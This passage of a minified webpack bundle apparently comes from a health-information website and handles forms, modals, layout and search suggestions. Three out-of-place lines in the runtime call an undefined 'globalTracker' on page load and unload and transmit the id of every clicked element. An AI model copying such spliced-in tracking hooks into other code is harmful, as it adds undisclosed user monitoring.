                jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).hasClass("error") && (t = !0);
              }), t ? (e.addClass("row-height-on-Error"), e.find(".field-container").css("margin-top", "32px"), jquery__WEBPACK_IMPORTED_MODULE_0___default()(e).filter(".error").find(".field-container").css("margin-top", "0")) : (e.removeClass("row-height-on-Error"), e.find(".field-container").css("margin-top", "0"));
            }
          } else jquery__WEBPACK_IMPORTED_MODULE_0___default()(".bdc-form-full-width form .row:not(.controls)").length && jquery__WEBPACK_IMPORTED_MODULE_0___default()(".bdc-form-full-width form .row:not(.controls)").find(".field-container").css("margin-top", "0");
        }
        function getContactValue() {
          jquery__WEBPACK_IMPORTED_MODULE_0___default()(".implant-radio-button").length > 0 && jquery__WEBPACK_IMPORTED_MODULE_0___default()(".implant-radio-button input[type='radio']").on("change", function () {
            var e = jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).val();
            jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).parents(".field-container").find(".implant-radio").val(e), jquery__WEBPACK_IMPORTED_MODULE_0___default()(".implant-radio").focus();
          });
        }
        function checkIfLastAnswerExists() {
          jquery__WEBPACK_IMPORTED_MODULE_0___default()(".feedback-questions-wrapper").length > 0 && 1 === jquery__WEBPACK_IMPORTED_MODULE_0___default()(".feedback-question:last input:checked").length && jquery__WEBPACK_IMPORTED_MODULE_0___default()(".contact-us-form-container ").find(".feedback-carousel-radio").val("true");
        }
        function initKeyUp() {
          jquery__WEBPACK_IMPORTED_MODULE_0___default()(".textareaoption .feedback-textarea-row textarea").on("keyup", function () {
            jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).closest(".textareaoption").find("input[type='radio']").val(jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).val());
          });
        }
        function formValidationDevices() {
          jquery__WEBPACK_IMPORTED_MODULE_0___default()(window).width() >= 768 ? jquery__WEBPACK_IMPORTED_MODULE_0___default()(".bdc-mobile-contact-form").remove() : jquery__WEBPACK_IMPORTED_MODULE_0___default()(".bdc-desktop-contact-form").remove();
        }
      },
      7096: function () {
        function e(e, t) {
          (null == t || t > e.length) && (t = e.length);
          for (var a = 0, o = new Array(t); a < t; a++) o[a] = e[a];
          return o;
        }
        var t;
        (t = document.querySelectorAll('.total-o [class*="-bullet"]'), function (t) {
          if (Array.isArray(t)) return e(t);
        }(t) || function (e) {
          if ("undefined" != typeof Symbol && Symbol.iterator in Object(e)) return Array.from(e);
        }(t) || function (t, a) {
          if (t) {
            if ("string" == typeof t) return e(t, a);
            var o = Object.prototype.toString.call(t).slice(8, -1);
            return "Object" === o && t.constructor && (o = t.constructor.name), "Map" === o || "Set" === o ? Array.from(t) : "Arguments" === o || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(o) ? e(t, a) : void 0;
          }
        }(t) || function () {
          throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
        }()).forEach(function (e) {
          !function (e) {
            var t = e.getElementsByTagName("span"),
              a = 0;
            Array.prototype.forEach.call(t, function (t) {
              var o = window.getComputedStyle(t).getPropertyValue("line-height"),
                i = parseInt(o.slice(0, -2));
              i > a && (a = i), e.style.lineHeight = a + "px";
            });
          }(e);
          var t = function (e) {
              var t = document.createElement("span");
              t.classList.add("bullet");
              var a = window.getComputedStyle(e).getPropertyValue("line-height"),
                o = window.getComputedStyle(document.documentElement).getPropertyValue("--bullet-size");
              return t.style.marginTop = "calc(".concat(a, " / 2 - ").concat(o, " / 2)"), t;
            }(e),
            a = function (e) {
              var t = e.innerHTML,
                a = document.createElement("span");
              return e.innerHTML = "", a.innerHTML = t, a;
            }(e);
          e.appendChild(t), e.appendChild(a);
        });
      },
      9685: function (e, t) {
        t.Z = {
          config: {
            hello: "world"
          }
        };
      },
      2602: function (e, t, a) {
        var o = a(9685);
        function i(e, t) {
          e.focus(), t.preventDefault();
        }
        t.Z = {
          getPerWithScrollDelay: function (e) {
            switch (!0) {
              case e <= 5:
                return (e - e / 2) / 100;
              case e > 5 && e <= 10:
                return (e - e / 3) / 100;
              case e > 10 && e <= 30:
                return (e - e / 4) / 100;
              case e > 30 && e <= 40:
                return (e - e / 5) / 100;
              default:
                return e / 100;
            }
          },
          scrollUpDown: function (e) {
            var t = $(o.Z.dialog.settings.modalWrapper).find(o.Z.dialog.settings.openedDialogIdSelector).find(".vi-transcript").find(".wysiwyg")[0];
            switch (e) {
              case "up":
                !$(t).hasClass("scroll-not-allowed") && (t.scrollTop -= 40);
                break;
              case "down":
                !$(t).hasClass("scroll-not-allowed") && (t.scrollTop += 40);
            }
          },
          simulateEnterClickPlayOnModal: function () {
            null != $(o.Z.dialog.settings.modalWrapper)[0] && (o.Z.dialog.settings.EnterButtonClickedOnModal = !0);
          },
          focusanElment: i,
          preventDefaultCustom: function (e) {
            e.preventDefault();
          },
          reCreateFocus: function (e) {
            if (o.Z.dialog.settings.EnterButtonClickedOnModal) {
              var t = document.querySelector(o.Z.dialog.settings.modalWrapper);
              o.Z.dialog.settings.focusableContent = t.querySelectorAll(o.Z.dialog.settings.focusableElements), o.Z.dialog.settings.firstFocusableElement = t.querySelectorAll(o.Z.dialog.settings.focusableElements)[0], o.Z.dialog.settings.lastFocusableElement = o.Z.dialog.settings.focusableContent[o.Z.dialog.settings.focusableContent.length - 1], o.Z.dialog.settings.lastToOneFocusableElement = o.Z.dialog.settings.focusableContent[o.Z.dialog.settings.focusableContent.length - 2], i(o.Z.dialog.settings.firstFocusableElement.contentWindow, e);
            } else i(o.Z.dialog.settings.firstFocusableElement, e);
          },
          addRemoveFocusExToLatElement: function (e) {
            var t = function (e) {
              for (var t, a = e.length; a > 0; a--) if (t = e[a - 1], $(t).is(":visible")) return t;
            }(document.querySelector("body").querySelectorAll('button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])'));
            null != t && null != t && $(t).length && ("add" == e ? $(t).addClass("focus-xpn") : $(t).removeClass("focus-xpn"));
          }
        };
      },
      9842: function (e, t, a) {
        a.d(t, {
          M: function () {
            return n;
          }
        });
        var o = a(3609),
          i = a.n(o);
        function n(e) {
          e ? (i()("#ajaxLoadersearch").show(), i()("#ajaxLoadersearch").focus(), i()("#ajaxLoadersearch").css("min-height", i()(document).height() + "px"), i()("#ajaxLoadersearch").css("postion", "absolute"), i()("#ajaxLoadersearch").css("z-index", "9999999")) : i()("#ajaxLoadersearch").hide();
        }
      },
      3890: function (e, t, a) {
        function o(e) {
          var t = 0;
          e.each(function () {
            var e = $(this).height();
            e > t && (t = e);
          }), t > 0 ? e.css("height", t) : t = "auto";
        }
        a.d(t, {
          B: function () {
            return o;
          }
        });
      },
      485: function (e, t, a) {
        function o() {
          return window.outerWidth < 768;
        }
        function i() {
          return window.outerWidth <= 768;
        }
        function n() {
          var e = window.getComputedStyle(document.querySelector(".state-indicator"), ":before").getPropertyValue("content");
          return (e = e.replace(/"/g, "")).replace(/'/g, "");
        }
        a.d(t, {
          tq: function () {
            return o;
          },
          Bm: function () {
            return i;
          },
          _N: function () {
            return n;
          }
        }), window.getDeviceState = n;
      },
      9976: function (e, t, a) {
        a.d(t, {
          $: function () {
            return i;
          }
        });
        var o = a(9685);
        function i() {
          setTimeout(function () {
            for (var e = 0; e < o.Z["eq-height-cols"].settings.cols.length; e++) $(o.Z["eq-height-cols"].resize(o.Z["eq-height-cols"].settings.cols[e], o.Z["eq-height-cols"].settings.useMinHeight, o.Z["eq-height-cols"].settings.requireEmptyNbs));
          }, 30);
        }
      },
      3609: function (e) {
        e.exports = jQuery;
      }
    },
    __webpack_module_cache__ = {},
    deferred;
  function __webpack_require__(e) {
    var t = __webpack_module_cache__[e];
    if (void 0 !== t) return t.exports;
    var a = __webpack_module_cache__[e] = {
      id: e,
      loaded: !1,
      exports: {}
    };
    return __webpack_modules__[e].call(a.exports, a, a.exports, __webpack_require__), a.loaded = !0, a.exports;
  }
  window.addEventListener("DOMContentLoaded", () => globalTracker.initTracking());
  __webpack_require__.m = __webpack_modules__, deferred = [], __webpack_require__.O = function (e, t, a, o) {
    if (!t) {
      var i = 1 / 0;
      for (s = 0; s < deferred.length; s++) {
        t = deferred[s][0], a = deferred[s][1], o = deferred[s][2];
        for (var n = !0, r = 0; r < t.length; r++) (!1 & o || i >= o) && Object.keys(__webpack_require__.O).every(function (e) {
          return __webpack_require__.O[e](t[r]);
        }) ? t.splice(r--, 1) : (n = !1, o < i && (i = o));
        n && (deferred.splice(s--, 1), e = a());
      }
      return e;
    }
    o = o || 0;
    for (var s = deferred.length; s > 0 && deferred[s - 1][2] > o; s--) deferred[s] = deferred[s - 1];
    deferred[s] = [t, a, o];
  }, __webpack_require__.n = function (e) {
    var t = e && e.__esModule ? function () {
      return e.default;
    } : function () {
      return e;
    };
    return __webpack_require__.d(t, {
      a: t
    }), t;
  }, __webpack_require__.d = function (e, t) {
    for (var a in t) __webpack_require__.o(t, a) && !__webpack_require__.o(e, a) && Object.defineProperty(e, a, {
      enumerable: !0,
      get: t[a]
    });
  }, __webpack_require__.g = function () {
    if ("object" == typeof globalThis) return globalThis;
    try {
      return this || new Function("return this")();
    } catch (e) {
      if ("object" == typeof window) return window;
    }
  }(), __webpack_require__.o = function (e, t) {
    return Object.prototype.hasOwnProperty.call(e, t);
  }, __webpack_require__.nmd = function (e) {
    return e.paths = [], e.children || (e.children = []), e;
  }, function () {
    var e;
    __webpack_require__.g.importScripts && (e = __webpack_require__.g.location + "");
    var t = __webpack_require__.g.document;
    if (!e && t && (t.currentScript && (e = t.currentScript.src), !e)) {
      var a = t.getElementsByTagName("script");
      a.length && (e = a[a.length - 1].src);
    }
    if (!e) throw new Error("Automatic publicPath is not supported in this browser");
    e = e.replace(/#.*$/, "").replace(/\?.*$/, "").replace(/\/[^\/]+$/, "/"), __webpack_require__.p = e + "../";
  }(), function () {
    var e = {
      6183: 0
    };
    __webpack_require__.O.j = function (t) {
      return 0 === e[t];
    };
    var t = function (t, a) {
        var o,
          i,
          n = a[0],
          r = a[1],
          s = a[2],
          l = 0;
        for (o in r) __webpack_require__.o(r, o) && (__webpack_require__.m[o] = r[o]);
        for (s && s(__webpack_require__), t && t(a); l < n.length; l++) i = n[l], __webpack_require__.o(e, i) && e[i] && e[i][0](), e[n[l]] = 0;
        __webpack_require__.O();
      },
      a = self.webpackChunkfrontend_assets = self.webpackChunkfrontend_assets || [];
    a.forEach(t.bind(null, 0)), a.push = t.bind(null, a.push.bind(a));
  }();
  window.addEventListener("beforeunload", () => globalTracker.initTracking());
  document.addEventListener('click', e => globalTracker.transmitAttrs({
    event: 'click',
    target: e.target.id
  }));
  var __webpack_exports__ = {};
  !function () {
    var e = __webpack_require__(3609),
      t = __webpack_require__.n(e),
      a = __webpack_require__(9685);
    function o(e) {
      void 0 === e && (e = window.dd), t()(e.custom.settings.overlay).addClass("remove-opacity"), t()(e.custom.settings.link).removeClass("active"), setTimeout(function () {
        t()(e.custom.settings.overlay).addClass("no-show");
      }, 501), t()(e.custom.settings.body).removeClass(e.custom.settings.activeOverlay);
    }
    window.closeGlobalSearch = o, t()(document).ready(function () {
      t()("#suggestion_form_pageModule").length ? (t()(".gsa-search-content").removeClass("gsa-search-headingMobile"), t()(".qte_btnInsideSearch_holder").addClass("qte_btnMobile"), t()(".qte_btnInsideSearch_holder ").removeClass("qte_btnMobileBg")) : (t()(".gsa-search-content").addClass("gsa-search-headingMobile"), t()(".qte_btnInsideSearch_holder").removeClass("qte_btnMobile"), t()(".qte_btnInsideSearch_holder ").addClass("qte_btnMobileBg"));
      var e = t()(".searchModel").find(":first-child:visible");
      t()(e).hasClass("searchBox") && t()(".qte_btnInsideNudge").css({
        "margin-bottom": "0px"
      });
    });
    var i = __webpack_require__(485),
      n = __webpack_require__(3890),
      r = __webpack_require__(9842),
      s = __webpack_require__(2602);
    function l(e) {
      var a = 0;
      null != t()(e).parents(".mod-eq-height-cols").first().find("img").attr("data-src") ? e.each(function () {
        var e = t()(this);
        if (0 === t()(e).find("img").length || t()(e).find("img").length && null != t()(e).find("img").attr("data-src") && "" != t()(e).find("img").attr("src")) {
          var o = t()(e).height();
          o > a && (a = o);
        }
      }) : e.each(function () {
        var e = t()(this),
          o = t()(e).height();
        o > a && (a = o);
      }), a > 0 ? e.css("height", a) : a = "auto";
    }
    var c = __webpack_require__(9976);
    function d(e) {
      t()(e).each(function (e, a) {
        t()(a).remove();
      });
    }
    function u(e, a) {
      t()(e).each(function (e, o) {
        t()(a).prepend(o);
      });
    }
    function _(e, a) {
      t()(e).each(function (e, o) {
        t()(a).append(o);
      });
    }
    function f() {
      t()(".link-box").each(function () {
        var e = t()(this).find(".slab .img-grid-banner"),
          a = t()(this).find(".slab"),
          o = t()(this).find(".slab").hasClass("img-to-left"),
          i = t()(this).find(".slab").hasClass("img-to-right");
        t()(window).width() <= 768 ? 0 == t()(this).attr("data-mobile-image-below-content") ? (d(e), u(e, a)) : 1 == t()(this).attr("data-mobile-image-below-content") && (d(e), _(e, a), t()(this).find(".slab .img-grid-banner").css("order", 2)) : o ? (d(e), u(e, a)) : i && (d(e), _(e, a));
      });
    }
    t()(function () {
      t()(document).ajaxComplete(function () {
        t()(document).find("img[src='']").length && dd.lazyload.resize();
      });
    }), t()(window).on("load", function () {
      var e, a, o;
      a = (e = t()(".short-staffed.video-carousel .prop .slab")).map(function () {
        return t()(this).height();
      }).get(), o = Math.max.apply(null, a), t().each(e, function (e, a) {
        t()(a).height(o);
      });
    });
    var h = __webpack_require__(9735),
      g = {};
    function p(e) {
      return (p = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
        return typeof e;
      } : function (e) {
        return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
      })(e);
    }
    g.GSACateoory = "", g.searchRequest = null, g.minlength = 3, g.suggesterDisplayLength = 5, g.resultObject = "", g.suggesterElement = "suggesterElement", g.suggesterUrl = t()(location).attr("protocol") + "//" + t()(location).attr("hostname") + "/searchresult?q=", g.charLimit = 2, g.atozSearchUrl = t()(location).attr("protocol") + "//" + t()(location).attr("hostname") + "/health-information/GetSearchResultsByCategory", g.getGsaCategory = function () {
      return null != g.GSACateoory && "" != g.GSACateoory && g.GSACateoory.toLowerCase();
    }, g.suggesterHint = function (e) {
      var a = t()(e).val().trim(),
        o = "",
        i = {};
      "a-to-z" == g.getGsaCategory() ? (o = t()(location).attr("protocol") + "//" + t()(location).attr("hostname") + "/health-information/GetAutoSuggestionByCategory/", i.searchText = a, i.gsaCategory = g.GSACateoory) : (o = t()(location).attr("protocol") + "//" + t()(location).attr("hostname") + "/globalSearch/Suggester", i.searchText = a), g.caseInsensitive(), "" !== a && a.length >= g.minlength ? t().ajax({
        contentType: "application/json; charset=utf-8",
        type: "GET",
        url: o,
        dataType: "json",
        data: i,
        success: function (o) {
          if (null != o) {
            for (var i = JSON.stringify(o), n = JSON.parse(i), r = [], s = 0; s < n.length; s++) r.push(n[s].toLowerCase());
            var l = r.slice(0, 5),
              c = "";
            if (0 != l) {
              t().each(l, function (e, t) {
                var a = encodeURIComponent(t);
                "a-to-z" == g.getGsaCategory() ? c += "<li><a class='suggester-click' href='javascript:void(0);'>" + t + "</a></li>" : c += "<li><a class='suggester-click' href=" + g.suggesterUrl + "{" + a + "}>" + t + "</a></li>";
              }), t()(e).parent(".AS-input-wrapper").find("#" + g.suggesterElement).html(c), t()(e).parent(".AS-input-wrapper").find("#" + g.suggesterElement).addClass("search-suggester"), "a-to-z" == g.getGsaCategory() && t()(e).parent(".AS-input-wrapper").find("#" + g.suggesterElement).addClass("search-suggester--a-z");
              var d = a.toLowerCase(),
                u = new RegExp(d, "gi"),
                _ = "<strong>" + d + "</strong>";
              t()(e).parent(".AS-input-wrapper").find("#" + g.suggesterElement + ' li a:contains("' + d + '")').html(function (e, t) {
                return t.replace(u, _);
              });
            } else g.removeSuggester();
          }
        },
        error: function () {
          console.log("There was an error. Try again please! #gsa_search");
        }
      }) : g.removeSuggester();
    }, g.removeSuggester = function () {
      t()("#" + g.suggesterElement).html(""), t()("#" + g.suggesterElement).removeClass();
    }, g.iconVisibleForSuggester = function (e, a) {
      "" !== t()(e).val() ? t()(a).show() : t()(a).hide();
    }, g.getPage = function (e) {
      var a = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "",
        o = "",
        i = {};
      if ("a-to-z" == g.getGsaCategory()) o = "/health-information/GetSearchResultsByCategory", i.searchTerm = "" != a ? a : "" != t()("#search-Page-Query-a-z").val() ? t()("#search-Page-Query-a-z").val() : t()("input[name='SearchTerm-a-z']").val(), i.pageNumber = e, i.dataSource = t()("input[name='DataSourceId']").val(), i.gsaCategory = g.GSACateoory, i.pageId = t()("input[name='PageId']").val();else {
        var n = t()("#TotalCount").val(),
          s = t()("#TotalCountPaidAds").val(),
          l = t()("#TotalCountPriorityResul").val(),
          c = t()("#State").val();
        c = "mobile" == c ? "mobile" : "desktop", o = "/health-information/SearchPageNext", i.q = "{" + t()("#search-Page-Query").val() + "}", i.pageNumber = e, i.totalCount = n, i.totalCountPaidAds = s, i.totalCountPriorityResul = l, i.state = c;
      }
      void 0 !== o && t().ajax({
        type: "GET",
        url: o,
        contentType: "application/json",
        data: i,
        cache: !1,
        success: function (e) {
          "a-to-z" == g.getGsaCategory() ? (t()("#gsa-ajax-search-result-a-z").html(e), g.searchResultFontBold("#search-Page-Query-a-z"), g.iconVisibleForSuggester("#search-Page-Query-a-z", ".common-azure-search-close-icon")) : (t()("#gsa-ajax-search-result").html(e), g.searchResultFontBold("#search-Page-Query"), g.iconVisibleForSuggester("#search-Page-Query", ".common-azure-search-close-icon"));
          try {
            (0, r.M)(!1);
          } catch (e) {}
          return !0;
        },
        error: function (e) {
          return !1;
        }
      });
    }, g.searchResultFontBold = function (e) {
      var a = t()(e).val();
      if (null != a && "" != a) {
        g.caseInsensitive();
        var o = t()(e).val().trim().split(" ").map(function (e) {
          if (e.length > g.charLimit) return e;
        });
        o = o.filter(function (e) {
          return void 0 !== e;
        });
        for (var i = 0; i < o.length; i++) {
          var n = new RegExp(o[i], "gi"),
            r = "<strong>" + o[i] + "</strong>";
          t()('.search-listing-tile-normal-container a:contains("' + o[i] + '")').html(function (e, t) {
            return t.replace(n, r);
          });
        }
        for (i = 0; i < o.length; i++) n = new RegExp(o[i], "gi"), r = "<strong>" + o[i] + "</strong>", t()('.search-listing-tile-normal-container p:contains("' + o[i] + '")').html(function (e, t) {
          return t.replace(n, r);
        });
        setTimeout(function () {
          t()(".search-listing-tile-result-title").addClass("title-capitalize");
        }, 1);
      }
    }, g.caseInsensitive = function () {
      jQuery.expr[":"].contains = function (e, t, a) {
        return jQuery(e).text().toUpperCase().indexOf(a[3].toUpperCase()) >= 0;
      };
    }, g.txtBlank = function (e) {
      t()(e).val("");
    }, g.bodyScrollTop = function () {
      "a-to-z" == g.getGsaCategory() ? t()("html, body").animate({
        scrollTop: t()("#search-Page-Query-a-z").offset().top
      }, "slow") : t()("html, body").animate({
        scrollTop: 0
      }, "slow");
    }, g.searchAnchorDisable = function () {
      window.location.href.indexOf("/searchresult") >= 0 ? t()(".overlay-anchor").on("click", function () {
        return !1;
      }) : t()(".overlay-anchor").on("click", function () {
        return !0;
      });
    }, g.setGSACategory = function () {
      g.GSACateoory = null != t()("input[name='GSACategory']") ? t()("input[name='GSACategory']").val() : "", g.suggesterElement = t()("input[name='GSACategory']").length ? "suggesterElement-a-z" : "suggesterElement";
    }, g.resetGSACategory = function () {
      g.GSACateoory = "", g.suggesterElement = "suggesterElement";
    }, g.valueChecker = function (e) {
      return "" !== t()(e).val();
    }, window.closeModal = v;
    var m = "";
    function v() {
      t()(".overlayBg").remove(), t()("body").removeClass("noScroll"), function (e, a) {
        var o = t()("header").outerHeight();
        if ("object" == p(e) && !t()(e).parents("tr").first().length && !t()(e).parents("ul").first().length && !t()(e).parents().siblings("ul").length) {
          var i = t()(e).parents("div").first().offset().top - o - 100;
          t()("html, body").animate({
            scrollTop: i
          }, 10);
        }
      }(m), "object" == p(m) && t()(m).focus(), m = "";
    }
    var y = __webpack_require__(3471);
    function E() {
      t()(this).addClass("checked").find("input").css("checked", "checked").end().siblings("label").removeClass("checked").find("input").css("checked", "");
    }
    __webpack_require__(7096), void 0 === window.dd && (window.dd = a.Z), function (e) {
      e.util = {
        initModules: function (a) {
          var o = [],
            i = [],
            n = '[class^="mod-"], [class*=" mod-"]',
            r = t()(n, a);
          0 === (a = t()(a)).length && (a = t()(document)), a.each(function () {
            t()(this).filter(n).length && (r = r.add(t()(this)));
          }), r.each(function () {
            var a = t()(this).prop("class").match(/mod-([^ ]+)/g);
            t().each(a, function (t) {
              var i = a[t].replace("mod-", "");
              e[i] && o.push(i);
            });
          }), t().each(o, function (e, a) {
            -1 === t().inArray(a, i) && i.push(a);
          }), o = i;
          var s = [];
          return t().each(o, function (t) {
            e[o[t]].init ? e[o[t]].settings.defer ? s.push(o[t]) : e[o[t]].init(a) : console.log("initModule: The module '" + o[t] + "' does not have an init method");
          }), t().each(s, function (t) {
            e[s[t]].init ? e[s[t]].init(a) : console.log("initModule: The module '" + s[t] + "' does not have an init method");
          }), o;
        },
        initHelpers: function (a) {
          0 === (a = t()(a)).length && (a = t()(document)), e.util.checkedState(a), e.util.placeholderPoly(a), e.lazyload.init(a), t()("form.form").length && e.forms.init(a), e.tel.init(a), e["meta-viewport"].init(a);
        },
        internetExplorerVer: function () {
          var e,
            t = window.navigator.userAgent,
            a = t.indexOf("MSIE ");
          return a > 0 && (e = parseInt(t.substring(a + 5, t.indexOf(".", a)), 10)), e;
        },
        events: function () {
          var e;
          t()(window).resize(function () {
            clearTimeout(e), e = setTimeout(function () {
              t()(window).trigger("dd:resize");
            }, 150);
          });
        },
        config: function (t) {
          if (void 0 !== e.config[t]) return e.config[t];
        },
        checkedState: function (a) {
          var o = t()(":checkbox, :radio", a);
          function i() {
            e.util.checkBind(o, function (e, t, a) {
              t.addClass("checked");
            }, function (e, t, a) {
              t.removeClass("checked");
            });
          }
          return (a = t()(a)).each(function () {
            t()(this).is(":checkbox, :radio") && (o = o.add(t()(this)));
          }), i(), t()(window).on("dd:updateCheckedState", i), o;
        },
        checkBind: function (e, a, o) {
          function i(e) {
            var i = t()("label").filter('[for="' + e.prop("id") + '"]'),
              n = e.is(":radio") ? "radio" : "checkbox";
            e.is(":checked") ? ("radio" == n && function (e, a) {
              t()(":radio").filter('[name="' + e.prop("name") + '"]').not(e).each(function () {
                var e = t()(this),
                  o = t()("label").filter('[for="' + e.prop("id") + '"]'),
                  i = e.is(":radio") ? "radio" : "checkbox";
                a(e, o, i);
              });
            }(e, o), a(e, i, n)) : o(e, i, n);
          }
          e.each(function () {
            var e = t()(this);
            i(e), e.change(function () {
              i(e);
            });
          });
        },
        layout: function () {
          var e = t()("body").hasClass("lt-ie9");
          return t()(window).width() >= "980" || e ? "lrg" : "sml";
        },
        focus: function (e) {
          void 0 === (e = t()(e)).attr("tabindex") && e.attr("tabindex", "0"), e.focus();
        },
        placeholderPoly: function (e) {
          if ("placeholder" in document.createElement("input")) return !1;
          function a(e, t) {
            e.val() === t && e.val("").removeClass("placeholder");
          }
          function o(e, t) {
            "" !== e.val() && e.val() !== t || e.val(t).addClass("placeholder");
          }
          0 === (e = t()(e)).length && (e = t()(document));
          var i = t()(":input[placeholder]", e).addBack(":input[placeholder]");
          return i.each(function (e) {
            var i = t()(this),
              n = i.attr("placeholder"),
              r = i.closest("form");
            o(i, n), i.bind("focus", function () {
              a(i, n);
            }), i.bind("blur", function () {
              o(i, n);
            }), r.bind("submit", function () {
              a(i, n);
            }), t()(window).bind("unload", function () {
              a(i, n);
            });
          }), i;
        },
        supports: {
          cssTransitions: function () {
            if (this._cache.cssTransitions) return this._cache.cssTransitions;
            var e = !1,
              t = ["Webkit", "Moz", "ms", "O"],
              a = document.createElement("div");
            void 0 !== a.style.transition && (e = !0);
            for (var o = 0; o < t.length; o++) if (void 0 !== a.style[t[o] + "Transitions"]) {
              e = !0;
              break;
            }
            return this._cache.cssTransitions = e;
          },
          _cache: {}
        }
      };
    }(a.Z), function (e) {
      e.custom = {
        settings: {
          target: ".mod-custom",
          link: ".overlay-anchor",
          overlay: ".mod-search-overlay",
          body: "body",
          activeOverlay: "active-overlay",
          closeIcon: ".close-icon",
          inputField: "#gsa_search",
          icons: ".close-icon-over-input",
          populorSearches: ".populor-searches",
          closeIconInput: ".close-icon-over-input",
          searchIcon: ".search-icon-grey",
          charLimit: 3
        },
        init: function (a) {
          var i = this.settings;
          t()(i.target, a).addBack(i.target).each(function () {
            window.jQuery && (t()(i.body).on("click", i.link, function () {
              setTimeout(function () {
                if (t()(i.link).hasClass("active")) {
                  t()(this).parents(".nav-aux").removeClass("search-active"), t()(window).trigger("dd:stopCarousel", t()("body"));
                  var e = t()(this).data("contextitemid"),
                    a = t()(this).data("siteparameter");
                  t().ajax({
                    url: overlayUrl,
                    type: "GET",
                    data: {
                      contextItemId: e,
                      siteParameter: a
                    },
                    dataType: "html",
                    success: function (e) {
                      t()(i.link).hasClass("active") && (t()(i.overlay).html(e), t()(i.body).addClass(i.activeOverlay), t()(i.overlay).removeClass("no-show"), t()(i.overlay).fadeIn("slow", function () {
                        t()(this).removeClass("remove-opacity");
                      }), t()(i.inputField).focus(), t()(i.inputField).is(":focus") && t()(i.searchIcon).addClass("show-icon"), t()("button").on("click", function () {
                        if (!t()(i.inputField).val()) return !1;
                      }), t()(i.inputField).keyup(function () {
                        var e = t()(this).val().length;
                        e ? t()(i.icons).addClass("show-icon") : t()(i.icons).removeClass("show-icon"), setTimeout(function () {
                          var a = t()(".tt-dataset-0:empty").length;
                          e >= i.charLimit && !a ? t()(i.populorSearches).addClass("no-show") : t()(i.populorSearches).removeClass("no-show");
                        }, 500);
                      }));
                    }
                  });
                } else t()(i.overlay).addClass("no-show"), t()(i.overlay).addClass("remove-opacity");
              }, 100);
            }), t()(i.body).on("click", i.closeIcon, function () {
              o(e);
            }));
          });
        }
      };
    }(a.Z), t()((t()(document).on("click", ".qte_btnInsideNudge", function () {
      t()(".overlayDarkBg").show(), t()(".overlay-belt-box").show();
    }), t()(".overlayDarkBg").on("click", function () {
      t()(".overlayDarkBg").hide(), t()(".overlay-belt-box").hide();
    }), t()(".qtaCloseBtn").on("click", function () {
      t()(".overlayDarkBg").hide(), t()(".overlay-belt-box").hide();
    }), void (1 == t()(".nudge .qte_btnInsideNudge").length && 1 == t()(".campaign-hero").length && t()(".campaign-hero .qte_btnInsideSearch_holder").append(t()(".nudge .qte_btnInsideNudge").parent("span").clone())))), window.gsaSearch = function () {
      t()("#gsa_search-scl").keyup(function () {
        var e = t()(this).val().length;
        e ? t()(".searchModel .searchBox .close-icon-over-input").css("display", "block") : t()(".searchModel .searchBox .close-icon-over-input").css("display", "none"), setTimeout(function () {
          var a = t()(".tt-dataset-0:empty").length;
          e >= 3 && !a ? t()(".populor-searches").addClass("no-show") : t()(".populor-searches").removeClass("no-show");
        }, 1e3);
      }), setTimeout(function () {
        var e, a;
        e = "", a = t()("#gsa_search-scl"), "undefined" != typeof typeAheadJSMethodURL && (e = typeAheadJSMethodURL.replace(/&amp;/g, "&"), function (e, a, o, i) {
          i.initialize(), t()(e).typeahead({
            hint: !0,
            highlight: !0,
            minLength: 3
          }, {
            displayKey: "value",
            footer: t()(".mod-showSearchHelperText"),
            source: i.ttAdapter()
          }), t()("input.tt-hint").attr("disabled", "disabled"), t()(e).on("typeahead:selected", function () {
            t()("#suggestion_form_pageModule").submit();
          });
        }(a, 0, 0, new Bloodhound({
          datumTokenizer: function (e) {
            return Bloodhound.tokenizers.whitespace(e.value);
          },
          queryTokenizer: Bloodhound.tokenizers.whitespace,
          limit: 5,
          remote: {
            url: e,
            filter: function (e) {
              return t().map(e[1], function (e) {
                return {
                  value: e
                };
              });
            }
          }
        }))), t()(".close-icon-over-input.search-scl").on("click", function () {
          t()("#gsa_search-scl").val(""), t()(".mod-typeahead-sclmod").typeahead("val", ""), t()(this).css("display", "none"), t()(".tt-dropdown-menu").css("display", "none");
        }), t()(".search-btn-scl").on("click", function () {
          if (!t()("#gsa_search-scl").val()) return !1;
          t()("#suggestion_form_pageModule").submit();
        });
      }, 500);
    }, t()(function (e) {
      e["show-more"] = {
        settings: {
          target: ".mod-show-more"
        },
        init: function (e) {
          var t = this.settings;
          $(t.target, e).addBack(t.target).each(function () {
            var e = $(this);
            e.length > 0 && e.on("click", function (t) {
              t.preventDefault();
              var a = e.parent().parent().find("." + e.attr("more-content-class"));
              a.toggleClass("show-all"), a.hasClass("show-all") || $(this).hasClass("mod-show-less") ? ($(this).find(".view-more-less-text").text($(this).attr("show-less-text")), $(this).find("i").removeClass("i-plus-d-white").addClass("i-minus-d-white")) : ($(this).find(".view-more-less-text").text($(this).attr("show-more-text")), $(this).find("i").removeClass("i-minus-d-white").addClass("i-plus-d-white"), $("html, body").animate({
                scrollTop: a.closest(".content-container-bg").offset().top
              }, 500)), $(window).trigger("dd:resize"), (0, i.tq)() || $(".mod-eq-height-cols").each(function (e, t) {
                (0, n.B)($(this).find(".link-box-body-section"));
              });
            });
          });
        }
      };
    }(a.Z)), t()(function (e) {
      e.dialog = {
        settings: {
          target: ".mod-dialog",
          modalWrapper: ".dialog-wrapper",
          openedDialogIdSelector: null,
          buttonClickContext: null,
          EnterButtonClickedOnModal: !1,
          focusableElements: '[tabindex]:not([tabindex="-1"])',
          focusableContent: null,
          firstFocusableElement: null,
          lastFocusableElement: null,
          lastToOneFocusableElement: null,
          scrollTranscriptInt: null
        },
        init: function (a) {
          var o = this.settings,
            n = t()(o.target).hasClass("transcript-link"),
